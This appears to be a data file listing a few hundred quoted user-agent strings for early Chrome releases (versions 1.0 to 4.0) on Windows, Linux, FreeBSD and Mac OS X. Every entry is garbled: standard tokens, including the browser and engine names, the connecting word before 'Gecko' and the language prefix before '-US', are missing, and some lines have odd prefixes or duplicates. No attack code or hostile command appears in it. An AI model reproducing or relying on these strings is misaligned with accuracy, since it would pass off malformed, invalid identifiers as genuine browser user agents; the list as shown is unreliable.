	"/5.0 Windows; U; Windows NT 5.1; -US /532.2 KHTML,  Gecko /4.0.222.0 Safari/532.2"
	"/5.0 X11; U; Linux i686; -US /532.2 KHTML,  Gecko /4.0.221.8 Safari/532.2"
	"/5.0 X11; U; Linux i686 x86_64; -US /532.2 KHTML,  Gecko /4.0.221.8 Safari/532.2"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_1; -US /532.2 KHTML,  Gecko /4.0.221.8 Safari/532.2"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_8; -US /532.2 KHTML,  Gecko /4.0.221.8 Safari/532.2"
	"/5.0 X11; U; Linux x86_64; -US /532.2 KHTML,  Gecko /4.0.221.7 Safari/532.2"
	"/5.0 Windows; U; Windows NT 6.0; -US /532.2 KHTML,  Gecko /4.0.221.6 Safari/532.2"
	"/5.0 Windows; U; Windows NT 5.2; -US /532.2 KHTML,  Gecko /4.0.221.6 Safari/532.2"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.2 KHTML,  Gecko /4.0.221.6 Safari/532.2"
	"/5.0 X11; U; Linux x86_64; -US /532.2 KHTML,  Gecko /4.0.221.3 Safari/532.2"
	"/5.0 X11; U; Linux i686; -US /532.2 KHTML,  Gecko /4.0.221.0 Safari/532.2"
	"/5.0 Windows; U; Windows NT 6.0; -US /532.1 KHTML,  Gecko /4.0.220.1 Safari/532.1"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1"
	"/5.0 Windows; U; Windows NT 5.2; -US /532.1 KHTML,  Gecko /4.0.219.5 Safari/532.1"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.5 Safari/532.1"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.4 Safari/532.1"
	"/5.0 X11; U; Linux x86_64; -US /532.1 KHTML,  Gecko /4.0.219.3 Safari/532.1"
	"/5.0 Windows; U; Windows NT 5.2; -US /532.1 KHTML,  Gecko /4.0.219.3 Safari/532.1"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.3 Safari/532.1"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.0 Safari/532.1"
	"/5.0 X11; U; Linux x86_64; -US /532.1 KHTML,  Gecko /4.0.213.1 Safari/532.1"
	"/5.0 X11; U; Linux i686; -US /532.1 KHTML,  Gecko /4.0.213.1 Safari/532.1"
	"/5.0 Windows; U; Windows NT 6.1; -US /532.1 KHTML,  Gecko /4.0.213.1 Safari/532.1"
	"/5.0 Windows; U; Windows NT 6.0; -US /532.1 KHTML,  Gecko /4.0.213.1 Safari/532.1"
	"/5.0 Windows; U; Windows NT 5.2; -US /532.1 KHTML,  Gecko /4.0.213.1 Safari/532.1"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.213.1 Safari/532.1"
	"/5.0 X11; U; Linux x86_64; -US /532.1 KHTML,  Gecko /4.0.213.0 Safari/532.1"
	"/5.0 X11; U; Linux i686; -US /532.1 KHTML,  Gecko /4.0.213.0 Safari/532.1"
	"/5.0 Windows; U; Windows NT 5.2; -US /532.1 KHTML,  Gecko /4.0.213.0 Safari/532.1"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.213.0 Safari/532.1"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_0; -US /532.1 KHTML,  Gecko /4.0.212.1 Safari/532.1"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_7; -US /532.1 KHTML,  Gecko /4.0.212.1 Safari/532.1"
	"/5.0 X11; U; Linux x86_64; -US /532.0 KHTML,  Gecko /4.0.212.0 Safari/532.0"
	"/5.0 X11; U; Linux i686; -US /532.1 KHTML,  Gecko /4.0.212.0 Safari/532.1"
	"/5.0 X11; U; Linux i686; -US /532.0 KHTML,  Gecko /4.0.212.0 Safari/532.0"
	"/5.0 Windows; U; Windows NT 6.1; -US /532.0 KHTML,  Gecko /4.0.212.0 Safari/532.0"
	"/5.0 Windows; U; Windows NT 5.2; -US /532.0 KHTML,  Gecko /4.0.212.0 Safari/532.0"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.0 KHTML,  Gecko /4.0.212.0 Safari/532.0"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_1; -US /532.0 KHTML,  Gecko /4.0.212.0 Safari/532.0"
	"/5.0 Windows; U; Windows NT 6.0; -US /532.0 KHTML,  Gecko /4.0.211.7 Safari/532.0"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.0 KHTML,  Gecko /4.0.211.7 Safari/532.0"
	"/5.0 Windows; U; Windows NT 6.1; -US /532.0 KHTML,  Gecko /4.0.211.4 Safari/532.0"
	"/5.0 Windows; U; Windows NT 6.0; -US /532.0 KHTML,  Gecko /4.0.211.4 Safari/532.0"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.0 KHTML,  Gecko /4.0.211.4 Safari/532.0"
	"/5.0 X11; U; Linux x86_64; -US /532.0 KHTML,  Gecko /4.0.211.2 Safari/532.0"
	"/5.0 X11; U; Linux i686; -US /532.0 KHTML,  Gecko /4.0.211.2 Safari/532.0"
	"/5.0 Windows; U; Windows NT 6.0; -US /532.0 KHTML,  Gecko /4.0.211.2 Safari/532.0"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.0 KHTML,  Gecko /4.0.211.2 Safari/532.0"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_1; -US /532.0 KHTML,  Gecko /4.0.211.2 Safari/532.0"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_8; -US /532.0 KHTML,  Gecko /4.0.211.2 Safari/532.0"
	"/5.0 X11; U; Linux x86_64; -US /532.0 KHTML,  Gecko /4.0.211.0 Safari/532.0"
	"/5.0 X11; U; Linux i686; -US /532.0 KHTML,  Gecko /4.0.211.0 Safari/532.0"
	"/5.0 Windows; U; Windows NT 6.1; -US /532.0 KHTML,  Gecko /4.0.211.0 Safari/532.0"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.0 KHTML,  Gecko /4.0.211.0 Safari/532.0"
	"/5.0 Windows; U; Windows NT 5.2; -US /532.0 KHTML,  Gecko /4.0.210.0 Safari/532.0"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_8; -US /532.0 KHTML,  Gecko /4.0.210.0 Safari/532.0"
	"/5.0 X11; U; Linux x86_64; -US /532.0 KHTML,  Gecko /4.0.209.0 Safari/532.0"
	"/5.0 X11; U; Linux i686; -US /532.0 KHTML,  Gecko /4.0.209.0 Safari/532.0"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.0 KHTML,  Gecko /4.0.209.0 Safari/532.0"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_1; -US /532.0 KHTML,  Gecko /4.0.209.0 Safari/532.0"
	"/5.0 X11; U; Linux x86_64; -US /532.0 KHTML,  Gecko /4.0.208.0 Safari/532.0"
	"/5.0 Windows; U; Windows NT 6.1; -US /532.0 KHTML,  Gecko /4.0.208.0 Safari/532.0"
	"/5.0 Windows; U; Windows NT 6.0; -US /532.0 KHTML,  Gecko /4.0.208.0 Safari/532.0"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.0 KHTML,  Gecko /4.0.208.0 Safari/532.0"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_8; -US /532.0 KHTML,  Gecko /4.0.208.0 Safari/532.0"
	"/5.0 X11; U; Linux x86_64; -US /532.0 KHTML,  Gecko /4.0.207.0 Safari/532.0"
	"/5.0 X11; U; Linux i686; -US /532.0 KHTML,  Gecko /4.0.207.0 Safari/532.0"
	"/5.0 X11; U; FreeBSD i386; -US /532.0 KHTML,  Gecko /4.0.207.0 Safari/532.0"
	"/5.0 Windows; U; Windows NT 6.0; -US /532.0 KHTML,  Gecko /4.0.207.0 Safari/532.0"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.0 KHTML,  Gecko /4.0.207.0 Safari/532.0"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_1; -US /532.0 KHTML,  Gecko /4.0.207.0 Safari/532.0"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_8; -US /532.0 KHTML,  Gecko /4.0.207.0 Safari/532.0"
	"/5.0 X11; U; Linux i686; -US /532.0 KHTML,  Gecko /4.0.206.1 Safari/532.0"
	"/5.0 Windows; U; Windows NT 6.1; -US /532.0 KHTML,  Gecko /4.0.206.1 Safari/532.0"
	"/5.0 Windows; U; Windows NT 6.0; -US /532.0 KHTML,  Gecko /4.0.206.1 Safari/532.0"
	"/5.0 Windows; U; Windows NT 5.2; -US /532.0 KHTML,  Gecko /4.0.206.1 Safari/532.0"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.0 KHTML,  Gecko /4.0.206.1 Safari/532.0"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_0; -US /532.0 KHTML,  Gecko /4.0.206.1 Safari/532.0"
	"/5.0 X11; U; Linux x86_64; -US /532.0 KHTML,  Gecko /4.0.206.0 Safari/532.0"
	"/5.0 X11; U; Linux i686; -US /532.0 KHTML,  Gecko /4.0.206.0 Safari/532.0"
	"/5.0 Windows; U; Windows NT 6.1; -US /532.0 KHTML,  Gecko /4.0.206.0 Safari/532.0"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.0 KHTML,  Gecko /4.0.206.0 Safari/532.0"
	"/5.0 X11; U; Linux i686; -US /532.0 KHTML,  Gecko /4.0.205.0 Safari/532.0"
	"/5.0 X11; U; Linux x86_64; -US /532.0 KHTML,  Gecko /4.0.204.0 Safari/532.0"
	"/5.0 X11; U; Linux i686; -US /532.0 KHTML,  Gecko /4.0.204.0 Safari/532.0"
	"/5.0 Windows; U; Windows NT 6.1; -US /532.0 KHTML,  Gecko /4.0.204.0 Safari/532.0"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.0 KHTML,  Gecko /4.0.204.0 Safari/532.0"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_0; -US /532.0 KHTML,  Gecko /4.0.204.0 Safari/532.0"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_0; -US /532.0 KHTML,  Gecko /4.0.203.4 Safari/532.0"
	"/5.0 X11; U; Linux x86_64; -US /532.0 KHTML,  Gecko /4.0.203.2 Safari/532.0"
	"/5.0 X11; U; Linux i686; -US /532.0 KHTML,  Gecko /4.0.203.2 Safari/532.0"
	"/5.0 Windows; U; Windows NT 6.1; -US /532.0 KHTML,  Gecko /4.0.203.2 Safari/532.0"
	"/5.0 Windows; U; Windows NT 6.0; -US /532.0 KHTML,  Gecko /4.0.203.2 Safari/532.0"
	"/5.0 Windows; U; Windows NT 5.2; -US /532.0 KHTML,  Gecko /4.0.203.2 Safari/532.0"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.0 KHTML,  Gecko /4.0.203.2 Safari/532.0"
	"/5.0 X11; U; Linux x86_64; -US /532.0 KHTML,  Gecko /4.0.203.0 Safari/532.0"
	"/5.0 X11; U; Linux i686; -US /532.0 KHTML,  Gecko /4.0.203.0 Safari/532.0"
	"/5.0 Windows; U; Windows NT 6.1; -US /532.0 KHTML,  Gecko /4.0.203.0 Safari/532.0"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.0 KHTML,  Gecko /4.0.203.0 Safari/532.0"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_0; -US /532.0 KHTML,  Gecko /4.0.203.0 Safari/532.0"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_8; -US /532.0 KHTML,  Gecko /4.0.203.0 Safari/532.0"
	"/5.0 X11; U; Linux i686; -US /532.0 KHTML,  Gecko /4.0.202.2 Safari/532.0"
	"/5.0 X11; U; Linux i686 x86_64; -US /532.0 KHTML,  Gecko /4.0.202.2 Safari/532.0"
	"/5.0 Windows; U; Windows NT 6.0 x86_64; -DE /532.0 KHTML,  Gecko /4.0.202.2 Safari/532.0"
	"/5.0 Windows; U; Windows NT 5.2; -DE /532.0 KHTML,  Gecko /4.0.202.2 Safari/532.0"
	"/5.0 X11; U; Linux i686; -US /532.0 KHTML,  Gecko /4.0.202.0 Safari/532.0"
	"/5.0 Windows; U; Windows NT 6.1; -US /532.0 KHTML,  Gecko /4.0.202.0 Safari/532.0"
	"/5.0 Windows; U; Windows NT 6.0; -US /532.0 KHTML,  Gecko /4.0.202.0 Safari/532.0"
	"/5.0 Windows; U; Windows NT 5.2; -US /532.0 KHTML,  Gecko /4.0.202.0 Safari/532.0"
	"/5.0 Windows; U; Windows NT 5.1; -US /525.13 KHTML,  Gecko /4.0.202.0 Safari/525.13."
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_0; -US /532.0 KHTML,  Gecko /4.0.202.0 Safari/532.0"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_8; -US /532.0 KHTML,  Gecko /4.0.202.0 Safari/532.0"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_7; -US /532.0 KHTML,  Gecko /4.0.202.0 Safari/532.0"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_6; -US /532.0 KHTML,  Gecko /4.0.202.0 Safari/532.0"
	"/5.0 Windows; U; Windows NT 6.1; -US /532.0 KHTML,  Gecko /4.0.201.1 Safari/532.0"
	"/5.0 Windows; U; Windows NT 6.0; -US /532.0 KHTML,  Gecko /4.0.201.1 Safari/532.0"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.0 KHTML,  Gecko /4.0.201.1 Safari/532.0"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.0 KHTML,  Gecko /3.0.201.0 Safari/532.0"
	"/5.0 X11; U; Linux i686; -US /532.0 KHTML,  Gecko /3.0.198.1 Safari/532.0"
	"/5.0 X11; U; Linux i686 x86_64; -US /532.0 KHTML,  Gecko /3.0.198.1 Safari/532.0"
	"/5.0 X11; U; Linux i686; -US /532.0 KHTML,  Gecko /3.0.198.0 Safari/532.0"
	"/5.0 X11; U; Linux i686 x86_64; -US /532.0 KHTML,  Gecko /3.0.198.0 Safari/532.0"
	"/5.0 Windows; U; Windows NT 6.0; -US /532.0 KHTML,  Gecko /3.0.198.0 Safari/532.0"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.0 KHTML,  Gecko /3.0.198.0 Safari/532.0"
	"/5.0 Windows; U; Windows NT 5.0; -US /532.0 KHTML,  Gecko /3.0.198 Safari/532.0"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_8; -US /532.0 KHTML,  Gecko /3.0.198 Safari/532.0"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_7; -US /532.0 KHTML,  Gecko /3.0.198 Safari/532.0"
	"/5.0 X11; U; Linux i686; -US /532.0 KHTML,  Gecko /3.0.197.11 Safari/532.0"
	"/5.0 Windows; U; Windows NT 6.1; -US /532.0 KHTML,  Gecko /3.0.197.11 Safari/532.0"
	"/5.0 Windows; U; Windows NT 6.0; -US /532.0 KHTML,  Gecko /3.0.197.11 Safari/532.0"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.0 KHTML,  Gecko /3.0.197.11 Safari/532.0"
	"/5.0 X11; U; Linux i686; -US /532.0 KHTML,  Gecko /3.0.197.0 Safari/532.0"
	"/5.0 X11; U; Linux i686 x86_64; -US /532.0 KHTML,  Gecko /3.0.197.0 Safari/532.0"
	"/5.0 Windows; U; Windows NT 6.1; -US /532.0 KHTML,  Gecko /3.0.197.0 Safari/532.0"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_8; -US /532.0 KHTML,  Gecko /3.0.197 Safari/532.0"
	"/5.0 Windows; U; Windows NT 6.1; -US /532.0 KHTML,  Gecko /3.0.196.2 Safari/532.0"
	"/5.0 Windows; U; Windows NT 6.0; -US /532.0 KHTML,  Gecko /3.0.196.2 Safari/532.0"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.0 KHTML,  Gecko /3.0.196.2 Safari/532.0"
	"/5.0 X11; U; Linux i686; -US /532.0 KHTML,  Gecko /3.0.196.0 Safari/532.0"
	"/5.0 X11; U; Linux i686 x86_64; -US /532.0 KHTML,  Gecko /3.0.196.0 Safari/532.0"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_7; -US /532.0 KHTML,  Gecko /3.0.196 Safari/532.0"
	"/5.0 Windows; U; Windows NT 6.1; -US /532.0 KHTML,  Gecko /3.0.195.6 Safari/532.0"
	"/5.0 Windows; U; Windows NT 6.0; -US /532.0 KHTML,  Gecko /3.0.195.6 Safari/532.0"
	"/5.0 Windows; U; Windows NT 5.2; -US /532.0 KHTML,  Gecko /3.0.195.6 Safari/532.0"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.0 KHTML,  Gecko /3.0.195.6 Safari/532.0"
	"/5.0 Windows; U; Windows NT 5.0; -US /532.0 KHTML,  Gecko /3.0.195.6 Safari/532.0"
	"/5.0 Windows; U; Windows NT 6.1; -US /532.0 KHTML,  Gecko /3.0.195.4 Safari/532.0"
	"/5.0 Windows; U; Windows NT 5.2; -US /532.0 KHTML,  Gecko /3.0.195.33 Safari/532.0"
	"/4.0 Windows; U; Windows NT 5.0; -US /532.0 KHTML,  Gecko /3.0.195.33 Safari/532.0"
	"/5.0 Windows; U; Windows NT 6.1; -US /532.0 KHTML,  Gecko /3.0.195.3 Safari/532.0"
	"/5.0 Windows; U; Windows NT 6.0; -US /532.0 KHTML,  Gecko /3.0.195.3 Safari/532.0"
	"/6.0 Windows; U; Windows NT 6.1; -US /532.0 KHTML,  Gecko /3.0.195.27 Safari/532.0"
	"/5.0 Windows; U; Windows NT 6.1; -US /532.0 KHTML,  Gecko /3.0.195.27 Safari/532.0"
	"/5.0 Windows; U; Windows NT 6.0; -US /532.0 KHTML,  Gecko /3.0.195.27 Safari/532.0"
	"/5.0 Windows; U; Windows NT 5.2; -US /532.0 KHTML,  Gecko /3.0.195.27 Safari/532.0"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.0 KHTML, Gecko /3.0.195.27"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.0 KHTML,  Gecko /3.0.195.27 Safari/532.0"
	"/5.0 Windows; U; Windows NT 5.0; -US /532.0 KHTML,  Gecko /3.0.195.27 Safari/532.0"
	"/5.0 X11; U; Linux x86_64; -US /532.0 KHTML,  Gecko /3.0.195.24 Safari/532.0"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.0 KHTML,  Gecko /3.0.195.24 Safari/532.0"
	"/5.0 Windows; U; Windows NT 6.1; -US /532.0 KHTML,  Gecko /3.0.195.21 Safari/532.0"
	"/5.0 Windows; U; Windows NT 6.0; -US /532.0 KHTML,  Gecko /3.0.195.21 Safari/532.0"
	"/5.0 Windows; U; Windows NT 5.2; -US /532.0 KHTML,  Gecko /3.0.195.21 Safari/532.0"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.0 KHTML,  Gecko /3.0.195.21 Safari/532.0"
	"/5.0 Windows; U; Windows NT 6.0; -US /532.0 KHTML,  Gecko /3.0.195.20 Safari/532.0"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.0 KHTML,  Gecko /3.0.195.20 Safari/532.0"
	"/5.0 Windows; U; Windows NT 6.0; -US /532.0 KHTML,  Gecko /3.0.195.17 Safari/532.0"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.0 KHTML,  Gecko /3.0.195.17 Safari/532.0"
	"/5.0 Windows; U; Windows NT 6.1; -US /532.0 KHTML,  Gecko /3.0.195.10 Safari/532.0"
	"/5.0 Windows; U; Windows NT 6.0; -US /532.0 KHTML,  Gecko /3.0.195.10 Safari/532.0"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.0 KHTML,  Gecko /3.0.195.10 Safari/532.0"
	"/5.0 X11; U; Linux i686; -US /532.0 KHTML,  Gecko /3.0.195.1 Safari/532.0"
	"/5.0 Windows; U; Windows NT 6.1; -US /532.0 KHTML,  Gecko /3.0.195.1 Safari/532.0"
	"/5.0 Windows; U; Windows NT 6.0; -US /532.0 KHTML,  Gecko /3.0.195.1 Safari/532.0"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.0 KHTML,  Gecko /3.0.195.1 Safari/532.0"
	"/5.0 X11; U; Linux i686; -US /531.4 KHTML,  Gecko /3.0.194.0 Safari/531.4"
	"/5.0 Windows; U; Windows NT 6.1; -US /531.4 KHTML,  Gecko /3.0.194.0 Safari/531.4"
	"/5.0 Windows; U; Windows NT 6.1; -US /531.3 KHTML,  Gecko /3.0.193.2 Safari/531.3"
	"/5.0 Windows; U; Windows NT 6.0; -US /531.3 KHTML,  Gecko /3.0.193.2 Safari/531.3"
	"/5.0 Windows; U; Windows NT 5.2; -US /531.3 KHTML,  Gecko /3.0.193.2 Safari/531.3"
	"/5.0 Windows; U; Windows NT 6.0; -US /531.3 KHTML,  Gecko /3.0.193.0 Safari/531.3"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_7; -US /531.3 KHTML,  Gecko /3.0.192 Safari/531.3"
	"/5.0 Windows; U; Windows NT 5.1; -US /531.2 KHTML,  Gecko /3.0.191.3 Safari/531.2"
	"/5.0 Windows; U; Windows NT 6.1; -US /531.0 KHTML,  Gecko /3.0.191.0 Safari/531.0"
	"/5.0 Windows; U; Windows NT 5.1; -US /531.0 KHTML,  Gecko /3.0.191.0 Safari/531.0"
	"/5.0 Windows; U; Windows NT 6.1; -US /531.0 KHTML,  Gecko /2.0.182.0 Safari/532.0"
	"/5.0 Windows; U; Windows NT 6.1; -US /531.0 KHTML,  Gecko /2.0.182.0 Safari/531.0"
	"/5.0 Windows; U; Windows NT 6.1; -US /530.0 KHTML,  Gecko /2.0.182.0 Safari/531.0"
	"/5.0 Windows; U; Windows NT 5.1; -US /530.8 KHTML,  Gecko /2.0.178.0 Safari/530.8"
	"/5.0 Windows; U; Windows NT 5.1; -US /530.8 KHTML,  Gecko /2.0.177.1 Safari/530.8"
	"/5.0 Windows; U; Windows NT 5.1; -US /530.8 KHTML,  Gecko /2.0.177.0 Safari/530.8"
	"/5.0 Windows; U; Windows NT 5.1; -US /530.7 KHTML,  Gecko /2.0.177.0 Safari/530.7"
	"/5.0 Windows; U; Windows NT 6.0; -US /530.7 KHTML,  Gecko /2.0.176.0 Safari/530.7"
	"/5.0 Windows; U; Windows NT 5.1; -US /530.7 KHTML,  Gecko /2.0.176.0 Safari/530.7"
	"/5.0 X11; U; Linux i686 x86_64; -US /530.7 KHTML,  Gecko /2.0.175.0 Safari/530.7"
	"/5.0 Windows; U; Windows NT 5.1; -US /530.7 KHTML,  Gecko /2.0.175.0 Safari/530.7"
	"/5.0 Windows; U; Windows NT 5.1; -US /530.6 KHTML,  Gecko /2.0.175.0 Safari/530.6"
	"/5.0 Windows; U; Windows NT 6.1; -US /530.6 KHTML,  Gecko /2.0.174.0 Safari/530.6"
	"/5.0 Windows; U; Windows NT 6.0; -US /530.6 KHTML,  Gecko /2.0.174.0 Safari/530.6"
	"/5.0 Windows; U; Windows NT 5.1; -US /530.6 KHTML,  Gecko /2.0.174.0 Safari/530.6"
	"/5.0 Windows; U; Windows NT 5.1; -US /530.5 KHTML,  Gecko /2.0.174.0 Safari/530.5"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_2; -US /530.6 KHTML,  Gecko /2.0.174.0 Safari/530.6"
	"/5.0 Windows; U; Windows NT 6.0; -US /530.5 KHTML,  Gecko /2.0.173.1 Safari/530.5"
	"/5.0 Windows; U; Windows NT 5.1; -US /530.5 KHTML,  Gecko /2.0.173.1 Safari/530.5"
	"/5.0 Windows; U; Windows NT 5.1; -US /530.5 KHTML,  Gecko /2.0.173.0 Safari/530.5"
	"/5.0 Windows; U; Windows NT 5.1; -US /530.5 KHTML,  Gecko /2.0.172.8 Safari/530.5"
	"/6.0 Windows; U; Windows NT 6.0; -US Gecko/2009032609 /2.0.172.6 Safari/530.7"
	"/6.0 Windows; U; Windows NT 6.0; -US Gecko/2009032609 KHTML,  Gecko /2.0.172.6 Safari/530.7"
	"/5.0 Windows; U; Windows NT 6.0; -US /530.5 KHTML,  Gecko /2.0.172.6 Safari/530.5"
	"/5.0 Windows; U; Windows NT 6.1; -US /530.5 KHTML,  Gecko /2.0.172.43 Safari/530.5"
	"/5.0 Windows; U; Windows NT 6.0; -US /530.5 KHTML,  Gecko /2.0.172.43 Safari/530.5"
	"/5.0 Windows; U; Windows NT 5.2; -US /530.5 KHTML,  Gecko /2.0.172.43 Safari/530.5"
	"/5.0 Windows; U; Windows NT 5.1; -US /530.5 KHTML,  Gecko /2.0.172.43 Safari/530.5"
	"/5.0 Windows; U; Windows NT 5.1; -US /530.5 KHTML,  Gecko /2.0.172.42 Safari/530.5"
	"/5.0 Windows; U; Windows NT 6.0; -US /530.5 KHTML,  Gecko /2.0.172.40 Safari/530.5"
	"/5.0 Windows; U; Windows NT 5.1; -US /530.5 KHTML,  Gecko /2.0.172.40 Safari/530.5"
	"/5.0 Windows; U; Windows NT 6.0; -US /530.5 KHTML,  Gecko /2.0.172.39 Safari/530.5"
	"/5.0 Windows; U; Windows NT 5.1; -US /530.5 KHTML,  Gecko /2.0.172.39 Safari/530.5"
	"/5.0 Windows; U; Windows NT 6.0; -US /530.5 KHTML,  Gecko /2.0.172.23 Safari/530.5"
	"/5.0 Windows; U; Windows NT 6.0; -US /530.5 KHTML,  Gecko /2.0.172.2 Safari/530.5"
	"/5.0 Windows; U; Windows NT 5.1; -US /530.5 KHTML,  Gecko /2.0.172.2 Safari/530.5"
	"/5.0 Windows; U; Windows NT 6.1; -US /530.4 KHTML,  Gecko /2.0.172.0 Safari/530.4"
	"/5.0 Windows; U; Windows NT 5.2;  /530.4 KHTML,  Gecko /2.0.172.0 Safari/530.4"
	"/5.0 Windows; U; Windows NT 5.2; -US /530.4 KHTML,  Gecko /2.0.172.0 Safari/530.4"
	"/5.0 Windows; U; Windows NT 5.1; -US /530.5 KHTML,  Gecko /2.0.172.0 Safari/530.5"
	"/5.0 Windows; U; Windows NT 6.0; -US /530.4 KHTML,  Gecko /2.0.171.0 Safari/530.4"
	"/5.0 Windows; U; Windows NT 5.1; -US /530.1 KHTML,  Gecko /2.0.170.0 Safari/530.1"
	"/5.0 Windows; U; Windows NT 5.1; -US /530.1 KHTML,  Gecko /2.0.169.0 Safari/530.1"
	"/5.0 Windows; U; Windows NT 6.0; -US /530.1 KHTML,  Gecko /2.0.168.0 Safari/530.1"
	"/5.0 Windows; U; Windows NT 6.0; -US /530.1 KHTML,  Gecko /2.0.164.0 Safari/530.1"
	"/5.0 Windows; U; Windows NT 6.0; -US /530.0 KHTML,  Gecko /2.0.162.0 Safari/530.0"
	"/5.0 Windows; U; Windows NT 6.0; -US /530.0 KHTML,  Gecko /2.0.160.0 Safari/530.0"
	"/5.0 Windows; U; Windows NT 6.0; -US /528.10 KHTML,  Gecko /2.0.157.2 Safari/528.10"
	"/5.0 Windows; U; Windows NT 5.1; -US /528.10 KHTML,  Gecko /2.0.157.2 Safari/528.10"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_0; -US /528.10 KHTML,  Gecko /2.0.157.2 Safari/528.10"
	"/5.0 Windows; U; Windows NT 6.0; -US /528.11 KHTML,  Gecko /2.0.157.0 Safari/528.11"
	"/5.0 Windows; U; Windows NT 5.1; -US /528.9 KHTML,  Gecko /2.0.157.0 Safari/528.9"
	"/5.0 Windows; U; Windows NT 5.1; -US /528.11 KHTML,  Gecko /2.0.157.0 Safari/528.11"
	"/5.0 Windows; U; Windows NT 5.1; -US /528.10 KHTML,  Gecko /2.0.157.0 Safari/528.10"
	"/5.0 Windows; U; Windows NT 6.1; -US /528.8 KHTML,  Gecko /2.0.156.1 Safari/528.8"
	"/5.0 Windows; U; Windows NT 6.0; -US /528.8 KHTML,  Gecko /2.0.156.1 Safari/528.8"
	"/5.0 Windows; U; Windows NT 5.1; -US /528.8 KHTML,  Gecko /2.0.156.1 Safari/528.8"
	"/5.0 Windows; U; Windows NT 5.1; -US /528.8 KHTML,  Gecko /2.0.156.0 /3.2.1 Safari/528.8"
	"/5.0 Windows; U; Windows NT 5.1; -US /528.8 KHTML,  Gecko /2.0.156.0 Safari/528.8"
	"/5.0 Windows; U; Windows NT 6.1; -US /528.8 KHTML,  Gecko /1.0.156.0 Safari/528.8"
	"/5.0 Windows; U; Windows NT 6.0; -US /525.19 KHTML,  Gecko /1.0.154.59 Safari/525.19"
	"/5.0 Windows; U; Windows NT 5.2; -US /525.19 KHTML,  Gecko /1.0.154.59 Safari/525.19"
	"/4.0 Windows; U; Windows NT 5.1; -US /525.19 KHTML,  Gecko /1.0.154.59 Safari/525.19"
	"/5.0 Windows; U; Windows NT 5.1; -US /525.19 KHTML,  Gecko /1.0.154.55 Safari/525.19"
	"/5.0 Windows; U; Windows NT 5.0; -US /525.19 KHTML,  Gecko /1.0.154.55 Safari/525.19"
	"/5.0 Windows; U; Windows NT 6.1; -US /525.19 KHTML,  Gecko /1.0.154.53 Safari/525.19"
	"/5.0 Windows; U; Windows NT 6.1; -US /525.19 KHTML,  Gecko /1.0.154.53 Safari/525.19"
	"/5.0 Windows; U; Windows NT 6.0; -US /525.19 KHTML,  Gecko /1.0.154.53 Safari/525.19"
	"/5.0 Windows; U; Windows NT 5.2; -US /525.19 KHTML,  Gecko /1.0.154.53 Safari/525.19"
	"/5.0 Windows; U; Windows NT 5.1; -US /525.19 KHTML,  Gecko /1.0.154.53 Safari/525.19"
	"/5.0 Windows; U; Windows NT 6.0; -US /525.19 KHTML,  Gecko /1.0.154.50 Safari/525.19"
	"/5.0 Windows; U; Windows NT 5.1; -US /525.19 KHTML,  Gecko /1.0.154.50 Safari/525.19"
